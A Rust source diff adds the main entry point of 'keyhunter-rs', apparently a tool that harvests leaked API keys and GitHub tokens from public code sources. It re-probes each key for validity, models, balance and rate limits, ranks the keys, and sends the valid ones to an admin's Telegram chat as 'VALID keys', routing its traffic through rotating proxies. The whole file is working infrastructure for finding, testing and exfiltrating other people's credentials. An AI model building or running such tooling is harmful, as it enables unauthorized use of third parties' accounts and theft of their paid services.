@@ -1,0 +1,579 @@
+mod app;
+mod atlas;
+mod auto;
+mod backup;
+mod bot;
+mod checker;
+mod config;
+mod extract;
+mod format;
+mod github;
+mod github_pat;
+mod official;
+mod pat;
+mod probe;
+mod proxy;
+mod rank;
+mod scan;
+mod searchplan;
+mod source_atlas;
+mod sources;
+mod store;
+mod stress;
+mod tg;
+
+use anyhow::{bail, Result};
+use app::{App, Job};
+use config::Config;
+use futures::StreamExt;
+use github::{Gh, PatPool};
+use probe::{PStatus, ProbeOpts, Prober};
+use proxy::ProxyPool;
+use sources::Sources;
+use std::sync::Arc;
+use store::{now, NewFinding, Store};
+use tg::Tg;
+use tokio::sync::mpsc;
+use tracing::info;
+use tracing_subscriber::EnvFilter;
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    dotenvy::dotenv().ok();
+    tracing_subscriber::fmt()
+        .with_env_filter(
+            EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
+        )
+        .init();
+
+    let args: Vec<String> = std::env::args().collect();
+    let cmd = args.get(1).map(|s| s.as_str()).unwrap_or("run");
+
+    match cmd {
+        "--backup" => {
+            let db = std::env::var("DB_PATH").unwrap_or_else(|_| "data/scanner.db".to_string());
+            let stamp = chrono::Local::now().format("%Y%m%d_%H%M%S").to_string();
+            let stage = std::path::PathBuf::from(format!("data/backups/cli-{stamp}"));
+            let zip = std::path::PathBuf::from(
+                args.get(2)
+                    .cloned()
+                    .unwrap_or_else(|| format!("data/backups/keyhunter-cli-{stamp}.zip")),
+            );
+            backup::create_archive(&db, &stage, &zip)?;
+            let size = std::fs::metadata(&zip)?.len();
+            println!("backup={} size={} bytes", zip.display(), size);
+            return Ok(());
+        }
+        "--demo" => {
+            println!("{}", format::card(&format::demo_finding()));
+            return Ok(());
+        }
+        "--check" => {
+            let (Some(url), Some(key)) = (args.get(2), args.get(3)) else {
+                eprintln!("usage: keyhunter-rs --check https://api.host/v1 sk-...");
+                return Ok(());
+            };
+            let prober = Prober::new(std::env::var("PROXY").ok())?;
+            let mut check_opts = ProbeOpts::default();
+            check_opts.all_types = true;
+            check_opts.video_generate = true;
+            let out = prober.probe(url, key, &check_opts).await;
+            println!(
+                "{} · {} · models={} · tested={} · balance={} · rpm={}",
+                out.status.as_str(),
+                out.base,
+                out.models.len(),
+                out.tested,
+                if out.balance.is_empty() {
+                    "?"
+                } else {
+                    out.balance.as_str()
+                },
+                if out.rpm.is_empty() {
+                    "?"
+                } else {
+                    out.rpm.as_str()
+                }
+            );
+            for p in &out.probes {
+                println!(
+                    "  {:>4}  {:>6}ms  {}{}",
+                    p.code,
+                    p.latency_ms,
+                    p.model,
+                    if p.note.is_empty() {
+                        String::new()
+                    } else {
+                        format!("  ({})", p.note)
+                    }
+                );
+            }
+            return Ok(());
+        }
+        "--checkfile" => {
+            let Some(path_in) = args.get(2) else {
+                eprintln!("usage: keyhunter-rs --checkfile pairs.txt [out.txt]");
+                return Ok(());
+            };
+            let text = std::fs::read_to_string(path_in)?;
+            let pairs = checker::parse_pairs(&text);
+            if pairs.is_empty() {
+                bail!("no key/base pairs in {path_in}");
+            }
+            let n = pairs.len();
+            let prober = Prober::new(std::env::var("PROXY").ok())?;
+            let rows = checker::check_pairs(&prober, &pairs, 0, 32).await;
+            let out_path = args
+                .get(3)
+                .map(|s| s.to_string())
+                .unwrap_or_else(|| "exports/api_check_cli.txt".to_string());
+            if let Some(parent) = std::path::Path::new(&out_path).parent() {
+                std::fs::create_dir_all(parent)?;
+            }
+            std::fs::write(&out_path, checker::render_rows(&rows, n))?;
+            #[cfg(unix)]
+            {
+                use std::os::unix::fs::PermissionsExt;
+                if let Some(parent) = std::path::Path::new(&out_path).parent() {
+                    let _ = std::fs::set_permissions(
+                        parent,
+                        std::fs::Permissions::from_mode(0o700),
+                    );
+                }
+                let _ = std::fs::set_permissions(
+                    &out_path,
+                    std::fs::Permissions::from_mode(0o600),
+                );
+            }
+            println!("pairs={n} valid={} -> {}", rows.len(), out_path);
+            return Ok(());
+        }
+        "--hi" => {
+            let (Some(url), Some(key), Some(model)) = (args.get(2), args.get(3), args.get(4)) else {
+                eprintln!("usage: keyhunter-rs --hi https://api.host/v1 sk-... model");
+                return Ok(());
+            };
+            let prober = Prober::new(std::env::var("PROXY").ok())?;
+            println!(
+                "hi={}",
+                prober.test_model_hi(url, key, model).await
+            );
+            return Ok(());
+        }
+        "--getme" => {
+            let cfg = Config::from_env()?;
+            let tg = Tg::new(&cfg.tg_token, cfg.tg_proxy.as_deref())?;
+            let me = tg.get_me().await?;
+            println!(
+                "@{} · id={} · bot={}",
+                me.username.clone().unwrap_or_default(),
+                me.id,
+                me.is_bot
+            );
+            return Ok(());
+        }
+        "--recheck" => {
+            let mode = args.get(2).map(|s| s.as_str());
+            let key_prefix = args.get(3).map(|s| s.as_str());
+            recheck_findings(mode, key_prefix).await?;
+            return Ok(());
+        }
+        "--rank" => {
+            let cfg = Config::from_env()?;
+            let endpoint = args
+                .get(2)
+                .ok_or_else(|| anyhow::anyhow!("usage: keyhunter-rs --rank https://host/v1 <key>"))?;
+            let key = args
+                .get(3)
+                .ok_or_else(|| anyhow::anyhow!("usage: keyhunter-rs --rank https://host/v1 <key>"))?;
+            let prober = Prober::new(std::env::var("PROXY").ok())?;
+            let opts = ProbeOpts {
+                probe_limit: 40,
+                concurrency: 8,
+                message: crate::probe::challenge_prompt("alibaba"),
+                challenge: "alibaba".into(),
+                cost_probe: false,
+                all_types: false,
+                timeout_secs: 30,
+                video_generate: false,
+            };
+            let out = prober.probe(endpoint, key, &opts).await;
+            let rank = crate::rank::evaluate(&cfg, endpoint, key, &out).await;
+            match rank {
+                Some(r) => println!(
+                    "status={} rank={} score={} verdict={} model={} note={}",
+                    out.status.as_str(),
+                    r.rank,
+                    r.score,
+                    r.verdict,
+                    r.model,
+                    r.note.chars().take(300).collect::<String>()
+                ),
+                None => println!("status={} rank=disabled", out.status.as_str()),
+            }
+            return Ok(());
+        }
+        "--sources" => {
+            let name = args.get(2).map(|s| s.as_str()).unwrap_or("gitee");
+            let query = args.get(3).map(|s| s.as_str()).unwrap_or("openai");
+            let limit = args
+                .get(4)
+                .and_then(|s| s.parse::<usize>().ok())
+                .unwrap_or(12);
+            let src = Sources::new(std::env::var("PROXY").ok())?;
+            if let Ok(st) = Store::open(
+                &std::env::var("DB_PATH").unwrap_or_else(|_| "data/scanner.db".to_string()),
+            ) {
+                src.set_pat_tokens_from_store(&st);
+            }
+            let docs = sources::prepare_docs(src.gather(name, query, limit).await?, limit);
+            let usable = docs
+                .iter()
+                .filter(|d| !sources::is_search_shell(d))
+                .count();
+            println!(
+                "source={} query={} docs={} usable={}",
+                name,
+                query,
+                docs.len(),
+                usable
+            );
+            for d in &docs {
+                if sources::is_search_shell(d) {
+                    continue;
+                }
+                let ex = extract::extract(&d.text);
+                println!(
+                    "  {} · {} · pairs={} keys={} endpoints={} opaque={}",
+                    d.source,
+                    d.repo,
+                    ex.pairs.len(),
+                    ex.keys.len(),
+                    ex.strong_endpoints().len(),
+                    extract::opaque_tokens(&d.text).len()
+                );
+            }
+            return Ok(());
+        }
+        "--export" => {
+            let db = std::env::var("DB_PATH").unwrap_or_else(|_| "data/scanner.db".to_string());
+            let store = Store::open(&db)?;
+            let rows = store.valid_pairs();
+            let path = args
+                .get(2)
+                .map(|s| s.to_string())
+                .unwrap_or_else(|| "exports/valid_keys.txt".to_string());
+            if let Some(parent) = std::path::Path::new(&path).parent() {
+                std::fs::create_dir_all(parent)?;
+            }
+            std::fs::write(&path, format::valid_txt(&rows))?;
+            println!("valid={} -> {}", rows.len(), path);
+            return Ok(());
+        }
+        "--export-send" => {
+            let cfg = Config::from_env()?;
+            let db = cfg.db_path.clone();
+            let store = Store::open(&db)?;
+            let rows = store.valid_pairs();
+            if rows.is_empty() {
+                println!("valid=0; nothing to send");
+                return Ok(());
+            }
+            let path = std::path::Path::new("exports/valid_keys.txt");
+            std::fs::create_dir_all("exports")?;
+            std::fs::write(path, format::valid_txt(&rows))?;
+            let tg = Tg::new(&cfg.tg_token, cfg.tg_proxy.as_deref())?;
+            tg.send_document(
+                cfg.admin_id,
+                path,
+                &format!("🔑 <b>VALID keys</b> · <b>{}</b>", rows.len()),
+            )
+            .await?;
+            println!("sent valid={} to {}", rows.len(), cfg.admin_id);
+            return Ok(());
+        }
+        "--send-unsent" => {
+            let cfg = Config::from_env()?;
+            let store = Store::open(&cfg.db_path)?;
+            let tg = Tg::new(&cfg.tg_token, cfg.tg_proxy.as_deref())?;
+            let chat = store
+                .setting("report_chat", "")
+                .parse::<i64>()
+                .unwrap_or(cfg.admin_id);
+            let rows = store.unsent_valid_findings();
+            let mut sent = 0usize;
+            for f in rows {
+                if !store.claim_card(f.id) {
+                    continue;
+                }
+                match tg.send(chat, &format::card(&f), None).await {
+                    Ok(_) => {
+                        sent += 1;
+                        println!("sent card #{} {}", f.id, f.key_kind);
+                    }
+                    Err(e) => {
+                        store.release_card(f.id);
+                        eprintln!("card #{} failed: {e}", f.id);
+                    }
+                }
+                tokio::time::sleep(std::time::Duration::from_millis(250)).await;
+            }
+            println!("sent_unsent={sent}");
+            return Ok(());
+        }
+        "--proxy-check" => {
+            let p = ProxyPool::new()?;
+            let n = p.refresh().await?;
+            println!(
+                "working={} best={}",
+                n,
+                p.best().unwrap_or_else(|| "none".into())
+            );
+            return Ok(());
+        }
+        "run" => {}
+        other => bail!(
+            "unknown command: {other} (use run, --check, --checkfile, --demo, --getme, --recheck, --sources, --export, --export-send, --send-unsent, --proxy-check)"
+        ),
+    }
+
+    run_bot().await
+}
+
+async fn recheck_findings(mode: Option<&str>, key_prefix: Option<&str>) -> Result<()> {
+    let db = std::env::var("DB_PATH").unwrap_or_else(|_| "data/scanner.db".to_string());
+    let store = Arc::new(Store::open(&db)?);
+    let prober = Arc::new(Prober::new(std::env::var("PROXY").ok())?);
+    let tg = std::env::var("TG_TOKEN")
+        .ok()
+        .and_then(|t| Tg::new(&t, None).ok());
+    let admin: Option<i64> = std::env::var("ADMIN_ID")
+        .ok()
+        .and_then(|v| v.trim().parse().ok());
+    let opts = ProbeOpts::default();
+    let rank_cfg = Config::from_env().ok();
+    let only_valid = mode == Some("valid");
+    let only_fake = mode == Some("fake");
+    let only_pat = mode == Some("pat");
+    let all = mode == Some("all");
+    let endpoint_filter =
+        mode.filter(|m| *m != "valid" && *m != "fake" && *m != "all" && *m != "pat");
+    let has_endpoint_filter = endpoint_filter.is_some();
+    let items: Vec<store::Finding> = store
+        .list_findings(100_000)
+        .into_iter()
+        .filter(|f| {
+            if only_pat {
+                return f.key_kind == "github_pat";
+            }
+            all || has_endpoint_filter
+                || (only_valid && f.status == "VALID")
+                || (only_fake && f.status == "FAKE")
+                || (!only_valid && !only_fake && f.status != "VALID")
+        })
+        .filter(|f| {
+            endpoint_filter
+                .map(|x| f.endpoint.contains(x))
+                .unwrap_or(true)
+        })
+        .filter(|f| {
+            // Optional narrow pass: `--recheck <endpoint-substr> <key-prefix>`
+            // re-probes only a credible key family instead of a whole host's
+            // junk pairs (a bare host can carry thousands of snippet keys).
+            key_prefix.map(|p| f.key.starts_with(p)).unwrap_or(true)
+        })
+        .collect();
+    if items.is_empty() {
+        println!("recheck: nothing");
+        return Ok(());
+    }
+    println!("recheck: {} findings", items.len());
+    let sem = Arc::new(tokio::sync::Semaphore::new(6));
+    let futs = items.into_iter().map(|f| {
+        let prober = prober.clone();
+        let sem = sem.clone();
+        let opts = opts.clone();
+        async move {
+            let _permit = sem.acquire_owned().await.ok();
+            let out = if f.key_kind == "github_pat" {
+                crate::github_pat::probe(&prober.http_client(), &f.endpoint, &f.key).await
+            } else {
+                prober.probe(&f.endpoint, &f.key, &opts).await
+            };
+            (f, out)
+        }
+    });
+    let results: Vec<_> = futures::stream::iter(futs)
+        .buffer_unordered(6)
+        .collect()
+        .await;
+    let mut counts: std::collections::BTreeMap<String, i64> = std::collections::BTreeMap::new();
+    let mut valid_hosts: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
+    for (f, out) in results {
+        let rank = if matches!(out.status, PStatus::Valid | PStatus::Limited)
+            && f.key_kind != "github_pat"
+            && !crate::probe::is_special_catalog(&out.models)
+            && store.needs_rank(
+                &f.endpoint,
+                &f.key,
+                store.setting_i64("rank_recheck_hours", 24),
+            ) {
+            match rank_cfg.as_ref() {
+                Some(cfg) => crate::rank::evaluate(cfg, &f.endpoint, &f.key, &out).await,
+                None => None,
+            }
+        } else {
+            None
+        };
+        let nf = NewFinding {
+            endpoint: f.endpoint.clone(),
+            key: f.key.clone(),
+            key_kind: f.key_kind.clone(),
+            repo: f.repo.clone(),
+            path: f.path.clone(),
+            commit_sha: f.commit_sha.clone(),
+            source: f.source.clone(),
+            status: out.status.as_str().to_string(),
+            pair: f.pair,
+            total_models: out.models.len() as i64,
+            tested: out.tested as i64,
+            chat_ok: out.chat_ok,
+            models: out.models.clone(),
+            probes: out.probes.clone(),
+            latency_ms: out.latency_ms as i64,
+            balance: out.balance.clone(),
+            rpm: out.rpm.clone(),
+            rank: rank.as_ref().map(|r| r.rank.clone()).unwrap_or_default(),
+            rank_score: rank.as_ref().map(|r| r.score).unwrap_or(-1),
+            rank_verdict: rank.as_ref().map(|r| r.verdict.clone()).unwrap_or_default(),
+            rank_note: rank.as_ref().map(|r| r.note.clone()).unwrap_or_default(),
+            ranked_at: rank.as_ref().map(|_| now()).unwrap_or(0),
+        };
+        let up = match store.upsert_finding(&nf) {
+            Ok(u) => u,
+            Err(e) => {
+                eprintln!("store: {e}");
+                continue;
+            }
+        };
+        *counts.entry(out.status.as_str().to_string()).or_insert(0) += 1;
+        if out.status == PStatus::Valid {
+            valid_hosts.insert(format::host_label(&f.endpoint));
+            if let (Some(tg), Some(chat)) = (&tg, admin) {
+                if !up.card_sent && store.claim_card(up.id) {
+                    if let Some(finding) = store.finding_by_id(up.id) {
+                        let card = format::card(&finding);
+                        if tg.send(chat, &card, None).await.is_err() {
+                            store.release_card(up.id);
+                        }
+                    } else {
+                        store.release_card(up.id);
+                    }
+                }
+            }
+        }
+    }
+    println!("recheck: {:?}", counts);
+    if !valid_hosts.is_empty() {
+        println!("valid hosts: {:?}", valid_hosts);
+    }
+    Ok(())
+}
+
+async fn run_bot() -> Result<()> {
+    let cfg = Config::from_env()?;
+    let store = Arc::new(Store::open(&cfg.db_path)?);
+    let stale = store.reset_running_jobs();
+    if stale > 0 {
+        info!("marked {} stale running jobs as interrupted", stale);
+    }
+    store.ensure_setting("report_chat", &cfg.admin_id.to_string())?;
+    // Make a new source pack visible on the first tick after deploy, not only
+    // when the old source backlog finally drains.
+    let mut rows: Vec<(String, String, i64)> = sources::tasks()
+        .iter()
+        .map(|(s, q)| (s.to_string(), q.to_string(), sources::task_priority(s)))
+        .collect();
+    rows.extend(
+        sources::provider_tasks()
+            .into_iter()
+            .map(|(s, q)| (s.to_string(), q.to_string(), 195)),
+    );
+    store.seed_source_tasks(&rows);
+    info!(
+        "source tasks seeded: {} static rows, {} provider rows",
+        sources::tasks().len(),
+        rows.len() - sources::tasks().len()
+    );
+
+    let tg = Arc::new(Tg::new(&cfg.tg_token, cfg.tg_proxy.as_deref())?);
+    if std::env::var("NO_POLL").map(|v| v == "1").unwrap_or(false) {
+        info!("NO_POLL=1: TG disabled (no getMe, no polling)");
+    } else {
+        let me = tg.get_me().await?;
+        info!(
+            "bot @{} id={} · admin {}",
+            me.username.clone().unwrap_or_default(),
+            me.id,
+            cfg.admin_id
+        );
+    }
+
+    let pool = Arc::new(PatPool::new(store.clone()));
+    pool.reload()?;
+    info!("PAT pool: {} alive", pool.alive());
+
+    let gh = Arc::new(Gh::new(store.clone(), pool.clone(), cfg.proxy.clone())?);
+    let prober = Arc::new(Prober::new(cfg.proxy.clone())?);
+    let sources = Arc::new(Sources::new(cfg.proxy.clone())?);
+    let proxy_pool = Arc::new(ProxyPool::new()?);
+    // Manual scans fan out to a large source pack; a 256-slot channel drops
+    // source jobs while GitHub jobs are still running. Reserve enough room
+    // for a full manual batch and the autonomous queue.
+    let (tx, rx) = mpsc::channel::<Job>(2048);
+    let probe_gate = Arc::new(tokio::sync::Semaphore::new(
+        store.setting_i64("probe_gate", 32).clamp(1, 128) as usize,
+    ));
+    let search_gate = Arc::new(tokio::sync::Semaphore::new(
+        store.setting_i64("search_concurrency", 4).clamp(1, 32) as usize,
+    ));
+    let source_gate = Arc::new(tokio::sync::Semaphore::new(
+        store.setting_i64("source_concurrency", 2).clamp(1, 16) as usize,
+    ));
+    let workers = store.setting_i64("workers", 24).clamp(1, 48) as usize;
+    let app = Arc::new(App {
+        cfg,
+        store: store.clone(),
+        tg: tg.clone(),
+        gh,
+        pool,
+        prober,
+        sources,
+        proxy_pool: proxy_pool.clone(),
+        scan_tx: tx,
+        awaiting: std::sync::Mutex::new(std::collections::HashMap::new()),
+        active_jobs: std::sync::atomic::AtomicUsize::new(0),
+        probe_gate,
+        search_gate,
+        source_gate,
+        manual_batches: std::sync::Mutex::new(std::collections::HashMap::new()),
+    });
+
+    app.sync_source_pats();
+    scan::spawn_workers(app.clone(), rx, workers);
+    tokio::spawn(auto::run(app.clone()));
+    // Restore a manually configured proxy after a restart.
+    let manual_proxy = store.setting("proxy", "");
+    if !manual_proxy.trim().is_empty() {
+        if let Err(e) = app.set_proxy(Some(manual_proxy)) {
+            tracing::warn!("manual proxy restore: {e}");
+        }
+    }
+    tokio::spawn(proxy::run(app.clone(), proxy_pool));
+    info!(
+        "scanner workers={} + auto-discovery + proxy manager started",
+        workers
+    );
+
+    bot::run(app).await
+}
